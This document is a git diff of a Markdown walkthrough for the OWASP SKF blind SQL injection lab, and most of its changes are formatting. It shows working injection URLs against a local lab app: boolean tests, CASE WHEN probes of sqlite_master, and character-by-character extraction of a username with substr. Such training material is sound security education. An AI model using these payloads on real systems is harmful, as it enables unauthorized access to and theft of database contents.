@@ -1,12 +1,12 @@
-# KBID 156 - SQLI \(Blind\)
+# Python - SQLI (Blind)
 
 ## Running the app
 
-```text
+```
 $ sudo docker pull blabla1337/owasp-skf-lab:sqli-blind
 ```
 
-```text
+```
 $ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:sqli-blind
 ```
 
@@ -16,9 +16,7 @@ Now that the app is running let's go hacking!
 
 ## Running the app Python3
 
-First, make sure python3 and pip are installed on your host machine.
-After installation, we go to the folder of the lab we want to practise
-"i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
+First, make sure python3 and pip are installed on your host machine. After installation, we go to the folder of the lab we want to practise "i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
 
 ```
 $ pip3 install -r requirements.txt
@@ -32,7 +30,7 @@ $ python3 <labname>
 Now that the app is running let's go hacking!
 {% endhint %}
 
-![Docker image and write-up thanks to Contrahack.io !](../../.gitbook/assets/screen-shot-2019-03-04-at-21.33.32.png)
+![Docker image and write-up thanks to Contrahack.io !](<../../.gitbook/assets/ing\_primary\_logo (2).png>)
 
 ## Reconnaissance
 
@@ -42,7 +40,7 @@ The first step is to identify parameters which could be potentially used in an S
 
 ![](../../.gitbook/assets/sqli-blind-1.png)
 
-```text
+```
 http://localhost:5000/home/1
 ```
 
@@ -52,7 +50,7 @@ Now let's see if we can create an error by injecting a single quote
 
 ![](../../.gitbook/assets/sqli-blind-2.png)
 
-```text
+```
 http://localhost:5000/home/1'
 ```
 
@@ -62,19 +60,19 @@ However, it's still not possile we can't see this as the application shows a 404
 
 Now we need to inject logic operators to check if the application is vulnerable to SQL Injection.
 
-First, we inject a logical operator which is true \(or 1=1\). This should result in the application run as intended without errors.
+First, we inject a logical operator which is true (or 1=1). This should result in the application run as intended without errors.
 
 ![](../../.gitbook/assets/sqli-blind-3.png)
 
-```text
+```
 http://localhost:5000/home/1 OR 1=1
 ```
 
-After that we inject a logical operator which is false \(and 1=2\). This should result in the application returning an error.
+After that we inject a logical operator which is false (and 1=2). This should result in the application returning an error.
 
 ![](../../.gitbook/assets/sqli-blind-4.png)
 
-```text
+```
 http://localhost:5000/home/1 AND 1=2--
 ```
 
@@ -96,13 +94,13 @@ We need to determine which conditions are TRUE and FALSE for the application. By
 
 ![](../../.gitbook/assets/sqli-blind-6.png)
 
-```text
+```
 http://localhost:5000/home/1
 ```
 
 ![](../../.gitbook/assets/sqli-blind-5.png)
 
-```text
+```
 http://localhost:5000/home/4
 ```
 
@@ -112,7 +110,7 @@ Now, we need to inject a IF condition, returning 1 for the TRUE cases and 4 for 
 
 ![](../../.gitbook/assets/sqli-blind-7.png)
 
-```text
+```
 http://localhost:5000/home/(select case when 1=1 then 1 else 4 end)
 ```
 
@@ -124,7 +122,7 @@ Let's check if the table users exists.
 
 ![](../../.gitbook/assets/sqli-blind-9.png)
 
-```text
+```
 http://localhost:5000/home/(select case when tbl_name='users' then 1 else 4 end from sqlite_master where type='table')
 ```
 
@@ -144,7 +142,7 @@ Let's try to extract a valid user. Instead of having a dictionary of possible us
 
 ![](../../.gitbook/assets/sqli-blind-11.png)
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,1,1)='a' then 1 else 4 end from users limit 0,1)
 ```
 
@@ -152,7 +150,7 @@ The error indicates it's not the case. Let's try with the letter _A_. Remember, 
 
 ![](../../.gitbook/assets/sqli-blind-12.png)
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,1,1)='A' then 1 else 4 end from users limit 0,1)
 ```
 
@@ -160,19 +158,19 @@ Yes, it matches!
 
 As initial guess, _Admin_ could be a possible user. So, let's test this theory:
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,2,1)='d' then 1 else 4 end from users limit 0,1)
 ```
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,3,1)='m' then 1 else 4 end from users limit 0,1)
 ```
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,4,1)='i' then 1 else 4 end from users limit 0,1)
 ```
 
-```text
+```
 http://localhost:5000/home/(select case when substr(UserName,5,1)='n' then 1 else 4 end from users limit 0,1)
 ```
 
@@ -188,8 +186,8 @@ Don't forget to play with Limit numbers to fetch more records.
 
 Please refer to the OWASP testing guide for a full complete description about SQL injection with all the edge cases over different platforms!
 
-[https://www.owasp.org/index.php/Testing_for_SQL_Injection\_\(OTG-INPVAL-005\)](https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29)
+[https://www.owasp.org/index.php/Testing\_for\_SQL\_Injection\_(OTG-INPVAL-005)](https://www.owasp.org/index.php/Testing\_for\_SQL\_Injection\_\(OTG-INPVAL-005\))
 
 SQLite Reference
 
-[https://www.techonthenet.com/sqlite/sys_tables/index.php](https://www.techonthenet.com/sqlite/sys_tables/index.php)
+[https://www.techonthenet.com/sqlite/sys\_tables/index.php](https://www.techonthenet.com/sqlite/sys\_tables/index.php)
